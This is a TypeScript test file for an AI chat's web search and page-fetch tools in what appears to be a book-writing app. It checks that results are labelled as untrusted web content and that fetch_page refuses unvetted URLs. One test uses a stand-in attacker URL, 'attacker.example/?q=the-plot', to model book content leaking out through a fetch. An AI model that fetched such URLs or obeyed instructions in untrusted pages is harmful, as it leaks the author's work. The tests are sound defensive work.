import { describe, expect, it } from 'bun:test';

import { chatScopeInstructions } from '@modules/ai/prompts/chat-refine.prompt';
import { toolsForNode } from '@modules/ai/tools/tool-registry.service';
import { type RegisteredTool, type ToolContext } from '@modules/ai/tools/types';
import { type WebLookups, type WebPage, type WebResult } from '@modules/ai/web';

function webTool(name: string): RegisteredTool {
  const tool = toolsForNode('chat-hub', 'brave').find(candidate => candidate.name === name);
  if (!tool) throw new Error(`${name} is not offered to the chat`);
  return tool;
}

function turn(results: WebResult[] = [], fetchable: string[] = []): { web: WebLookups; fetched: string[] } {
  const fetched: string[] = [];
  const web: WebLookups = {
    search: async () => results,
    fetch: async (url): Promise<WebPage> => {
      fetched.push(url);
      return { url, title: 'Hatchet', text: 'A boy survives the woods.' };
    },
    fetchable: new Set(fetchable),
  };
  return { web, fetched };
}

function ctx(web?: WebLookups): ToolContext {
  return { chapter: null, db: {} as never, node: 'chat-hub', projectId: 1n, retrieval: {} as never, runId: 'run-1', ...(web ? { web } : {}) };
}

async function message(promise: Promise<unknown>): Promise<string> {
  try {
    await promise;
  } catch (err) {
    return (err as Error).message;
  }
  return 'resolved';
}

const RESULT: WebResult = { title: 'Hatchet', url: 'https://example.com/hatchet#plot', snippet: 'A survival novel.', age: '3 years ago' };

describe('the web lookups', () => {
  it('should be offered only to the chat, and only on a turn that reaches the web through Brave', () => {
    const names = (node: string, web?: 'native' | 'brave' | 'off') => toolsForNode(node, web).map(tool => tool.name);

    expect(names('chat-hub')).not.toContain('search_web');
    expect(names('chat-hub', 'off')).not.toContain('search_web');
    expect(names('chat-hub', 'native')).not.toContain('search_web');
    expect(names('chat-hub', 'brave')).toEqual(expect.arrayContaining(['search_web', 'fetch_page']));
    expect(names('judge', 'brave')).not.toContain('search_web');
  });

  it('should list results under the untrusted-content note and let the turn fetch each of them', async () => {
    const { web } = turn([RESULT]);
    const out = String(await webTool('search_web').handler({ query: 'survival novels' }, ctx(web)));

    expect(out).toStartWith('Untrusted web content');
    expect(out).toContain('[1] Hatchet\nhttps://example.com/hatchet#plot · 3 years ago\nA survival novel.');
    expect([...web.fetchable]).toEqual(['https://example.com/hatchet']);
    expect(String(await webTool('search_web').handler({ query: 'nothing' }, ctx(turn().web)))).toBe('No web results.');
  });

  it('should fetch only a page this turn found or the author linked', async () => {
    const { web, fetched } = turn([], ['https://example.com/hatchet']);
    const fetchPage = webTool('fetch_page');

    expect(await message(fetchPage.handler({ url: 'https://attacker.example/?q=the-plot' }, ctx(web)))).toContain('search for it first');
    const out = String(await fetchPage.handler({ url: 'https://example.com/hatchet#plot' }, ctx(web)));

    expect(fetched).toEqual(['https://example.com/hatchet#plot']);
    expect(out).toContain('Source: https://example.com/hatchet#plot\n# Hatchet\n\nA boy survives the woods.');
  });

  it('should refuse outside a chat turn that carries web lookups', async () => {
    expect(await message(webTool('search_web').handler({ query: 'x y' }, ctx()))).toContain('not configured');
  });
});

describe('chatScopeInstructions — web research', () => {
  it('should say nothing about the web while it is off, and how to research in each mode', () => {
    expect(chatScopeInstructions([])).not.toContain('Web research');
    expect(chatScopeInstructions([], 'brave')).toContain('search_web, then read the most promising results in full with fetch_page');
    expect(chatScopeInstructions([], 'native')).toContain('your own built-in web search and page-fetch tools');
    expect(chatScopeInstructions([], 'native')).toContain('never copy its passages into the book');
  });
});
